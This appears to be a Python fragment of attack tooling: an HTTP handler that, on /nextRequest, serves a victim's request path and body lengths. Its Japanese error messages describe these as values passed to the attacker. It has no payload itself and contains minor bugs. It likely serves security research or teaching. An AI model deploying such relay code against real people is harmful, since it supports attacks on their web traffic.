import http.server

class CheckPathLengthAndBodyLengthEndpointHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.victim = self.server.victim
        if self.path == "/nextRequest":
            self.send_pathlength_and_bodylength()

    def send_pathlength_and_bodylength(self):
        if self.victim.pathLength == "":
            print("Eprror: 攻撃者に渡す pathLength が設定されていません。")
            self.send_response(500)
            self.end_headers()
            return

        if self.victim.postLength == "":
            print("Error: 攻撃者に渡す postLength が設定されていません。")
            self.send_error(500)
            self.end_headers()
            return


        self.send_response(200)
        self.send_header("Content-Type","text/html; charset=utf-8")
        self.end_headers()

        response = "{}:{}".format(self.victim.pathLength,self.victim.postLength)
        self.wfile.write(bytes(response,"utf-8"))